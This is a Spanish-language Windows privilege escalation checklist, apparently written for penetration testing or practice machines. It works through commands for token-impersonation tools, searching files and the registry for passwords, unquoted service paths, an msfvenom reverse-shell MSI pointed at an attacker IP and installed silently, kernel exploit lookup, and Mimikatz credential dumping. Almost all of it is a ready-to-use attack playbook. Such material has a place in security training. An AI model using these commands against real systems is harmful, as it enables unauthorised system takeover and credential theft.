# Escalada de Privilegios — Windows

## Descripción

Checklist completo para escalar privilegios en Windows una vez que tienes shell. El objetivo es pasar de usuario normal a **NT AUTHORITY\SYSTEM** o **Administrador**.

---

## Reconocimiento básico — Ejecuta siempre esto primero

```shell
whoami                          # Usuario actual
whoami /priv                    # Privilegios del usuario actual
whoami /groups                  # Grupos a los que pertenece
net user                        # Lista de usuarios
net localgroup administrators   # Miembros del grupo Administradores
systeminfo                      # Info del sistema, versión de Windows y parches
wmic os get caption             # Versión de Windows
wmic qfe list brief             # Parches instalados (hotfixes)
ipconfig /all                   # Interfaces de red
netstat -ano                    # Conexiones y puertos activos
tasklist /svc                   # Procesos y servicios
```

---

## Vector 1 — Privilegios peligrosos en whoami /priv ⭐

Algunos privilegios permiten escalar directamente. Comprueba con `whoami /priv`:

| Privilegio | Exploit |
|------------|---------|
| `SeImpersonatePrivilege` | **JuicyPotato / PrintSpoofer / GodPotato** |
| `SeAssignPrimaryTokenPrivilege` | JuicyPotato |
| `SeBackupPrivilege` | Leer archivos protegidos como SAM y SYSTEM |
| `SeRestorePrivilege` | Escribir en cualquier ruta del sistema |
| `SeTakeOwnershipPrivilege` | Tomar propiedad de cualquier archivo |

El más común en máquinas de práctica es `SeImpersonatePrivilege`. Si está habilitado:

```shell
# Descargar PrintSpoofer en la víctima
.\PrintSpoofer64.exe -i -c cmd
# o GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
```

---

## Vector 2 — Credenciales guardadas

```shell
# Credenciales guardadas en el sistema
cmdkey /list

# Si hay credenciales guardadas, úsalas con runas
runas /savecred /user:DOMINIO\Usuario cmd.exe

# Buscar contraseñas en archivos comunes
dir /s /b C:\*.txt 2>nul | findstr /i "pass"
dir /s /b C:\*.xml 2>nul
dir /s /b C:\*.ini 2>nul
findstr /si "password" C:\*.txt C:\*.xml C:\*.ini

# Registro de Windows (a veces tiene contraseñas en texto plano)
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Credenciales de AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

---

## Vector 3 — Servicios mal configurados

```shell
# Listar servicios y sus rutas
wmic service get name,displayname,pathname,startmode

# Buscar servicios con rutas sin comillas (Unquoted Service Path)
wmic service get name,pathname | findstr /i /v "C:\Windows\\"

# Permisos débiles en servicios
accesschk.exe -uwcqv * /accepteula
```

### Unquoted Service Path

Si una ruta de servicio tiene espacios y no tiene comillas:
```
C:\Program Files\Servicio Vulnerable\app.exe
```

Puedes colocar un ejecutable malicioso en:
```
C:\Program.exe
C:\Program Files\Servicio.exe
```

---

## Vector 4 — AlwaysInstallElevated

Si está habilitado, cualquier instalador MSI se ejecuta como SYSTEM:

```shell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Si ambas claves devuelven `0x1`:

```shell
# En Kali, crear MSI malicioso
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o evil.msi

# En la víctima
msiexec /quiet /qn /i evil.msi
```

---

## Vector 5 — Kernel exploit

```shell
systeminfo
wmic qfe list brief    # Ver parches instalados
```

Con la versión de Windows y los parches instalados, busca exploits:

```shell
# En Kali
searchsploit windows VERSION
```

Exploits clásicos por versión:

| Windows | Exploit |
|---------|---------|
| XP/2003 | MS08-067 |
| Vista/7/2008 | MS10-059 (Chimichurri) |
| 7/2008 R2 | MS16-032 |
| 10 (build antiguo) | PrintNightmare (CVE-2021-1675) |

---

## Vector 6 — Hashes con Mimikatz (si tienes Administrador)

Si ya tienes privilegios de Administrador pero necesitas credenciales:

```shell
# En Metasploit con sesión Meterpreter
load kiwi
creds_all

# O con mimikatz directo
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

---

## Herramientas automáticas de enumeración

```shell
# WinPEAS — la más completa para Windows
.\winpeas.exe

# PowerUp (PowerShell)
. .\PowerUp.ps1
Invoke-AllChecks
```

Descarga WinPEAS desde: `https://github.com/carlospolop/PEASS-ng`

---

## Checklist rápido

```
[ ] whoami /priv → SeImpersonatePrivilege → Potato/PrintSpoofer
[ ] cmdkey /list → credenciales guardadas
[ ] reg query → contraseñas en registro / AutoLogon
[ ] wmic service → Unquoted Service Path
[ ] AlwaysInstallElevated
[ ] systeminfo + parches → kernel exploit
[ ] WinPEAS si nada funciona
```
